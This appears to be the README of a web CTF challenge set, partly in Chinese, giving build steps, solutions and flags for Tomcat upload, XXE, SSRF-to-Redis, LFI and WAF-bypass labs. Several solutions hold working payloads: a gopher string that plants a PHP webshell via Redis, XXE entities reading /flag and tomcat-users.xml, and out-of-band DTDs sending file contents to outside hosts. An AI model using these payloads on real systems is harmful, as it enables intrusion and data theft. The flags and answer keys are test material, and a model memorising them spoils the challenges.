## TomcatUpload (SimpleUpload)

### Build

(改 tomcat/docker-compose.yml 的 port)

bash tomcat/restart.sh

### Solution

上傳 jsp webshell

### FLAG

FLAG{tomcat_upload_to_shell_is_toooo_ez}

---

## TomcatUpload2 (SimpleUpload2)

### Build

(改 tomcat/docker-compose.yml 的 port)

bash tomcat/restart.sh

### Solution

上傳 jspx webshell

### FLAG

FLAG{jsp_blacklist_bad}

---

## TomcatUpload3 (SimpleUpload3)

### Build

(改 tomcat/docker-compose.yml 的 port)

bash tomcat/restart.sh

### Solution

上傳 jsp el webshell

### FLAG

FLAG{wow_jsp_blacklist_bad_again}

---

## TomcatUpload4 (SimpleUpload4)

### Build

(改 tomcat/docker-compose.yml 的 port)

bash tomcat/restart.sh

### Solution

ref: realworld ctf
透過el改session內容&檔案位置 (放jsp webshell到session，改路徑到/tmp/xxx.jsp)
透過el改appbase到/
上傳爛jar觸發reload和寫session檔
存取jsp webshell

### FLAG

FLAG{yo_yo_jsp_blacklist_bad_again_and_again}

---
## Admin

### Build 

docker build -t admin .

docker run -ti -p 10001:80 admin bash

$ apachectl start

### Solution

admin menu 未登入時，會跳轉到 login 頁面

但跳轉時，程式未結束，依舊可以看到選單

存取選單上的連結即可取得 flag

### Flag

FLAG{congratz_here_is_your_flag!}

---



## MyConnector

### Build

docker build -t myconnector .

docker run -ti -p 7501:80 myconnector bash

$ apachectl start

$ service mysqld start

$ cat /mysql.sql | mysql -uroot

### Solution

using MySQL Rogue Server to read client's local file

### Flag

FLAG{mysql_read_file_cool}

---

## EzWAF

### Build

docker build -t ezwaf .

docker run -ti -p xxxxx:80 ezwaf bash

$ apachectl start

$ service mysqld start

$ cat /news.sql | mysql -uroot

### Solution

參考 ezwaf.py

### Flag

FLAG{PCRE_Byp4ss!!}

---

## LFI

### Build

docker build -t lfi .

docker run -ti -p 7502:80 lfi bash

$ apachectl start

### Solution

https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT

### Flag

FLAG{lfi=rce}

---

## redis

### Build

docker build -t "redis" .

docker run -ti -p [PORT]:80 redis /bin/bash

$ /start.sh

### Solution

gopher://localhost:6379/_FLUSHALL%0d%0aSET%20kaibro%20"<%3F=system($_GET[1]);%3F>"%0d%0aCONFIG%20SET%20DIR%20/www/%0d%0aCONFIG%20SET%20DBFILENAME%20ggininder123.php%0d%0aSAVE%0d%0aQUIT

### Flag

FLAG{ssrf<3redis}

---

## XXE

### Build

docker build -t xxe .

docker run -ti -p 10010:80 xxe bash

$ apachectl start

### Solution

```
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>
```

### Flag

FLAG{myf1rst_xx3_oh_ya}

---

## OOB XXE

### Build 

docker build -t oob .

docker run -ti -p 10011:80 oob bash

$ apachectl start

### Solution

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
%remote;
%all;
%send;
]>
```

xxe.dtd:

```
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://kaibro.tw/?a=%file;'>">
```

把 remote 位置 (kaibro.tw) 改成你自己的 server

### Flag

FLAG{W0W-U-g0t-m3}

---

## Gitlab

### Build

- docker-compose up
- 打tunnel出來(可以用ssh tunnel)，瀏覽器連 127.0.0.1:12345 -> 設root密碼 -> 新增flag repo
    - example:
        - ssh -D 9999 yourmachine
        - visit 127.0.0.1:12345 with proxy 127.0.0.1:9999

### Solution

### Flag

FLAG{SSRF_to_intranet_cool}

---

## cdata

### Build

docker build -t "cdata" .

docker run -ti -p 10012:80 cdata bash

$ apachectl start

### Solution

自己換一下 server

```
<!DOCTYPE data [
<!ENTITY % dtd SYSTEM "http://evil.com/bad.dtd">
%dtd;
%all;
]>
<data>&f;</data>
```

bad.dtd:

```
<!ENTITY % file SYSTEM "file:///flag.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
```

### Flag

FLAG{cdata_read_xmlfile_ezez}

---

## JXXE

### Build

docker-compose up --build

### Solution

/?xml=%3C%21DOCTYPE+data+%5B%0D%0A%3C%21ENTITY+%25+dtd+SYSTEM+%22http%3A%2F%2Fkaibro.tw%2Fhey.dtd%22%3E%0D%0A%25dtd%3B%0D%0A%25all%3B%0D%0A%5D%3E%0D%0A%3Croot%3E%26f%3B%3C%2Froot%3E

```
<!DOCTYPE data [
 <!ENTITY % dtd SYSTEM "http://kaibro.tw/hey.dtd">
     %dtd;
     %all;
 ]>
<root>&f;</root>
```

hey.dtd:

```
<!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/tomcat-users.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
```

=> 可以拿到 tomcat manager 密碼
=> 部署 war 包
=> RCE

### FLAG

FLAG{tomcat_meow_meow}
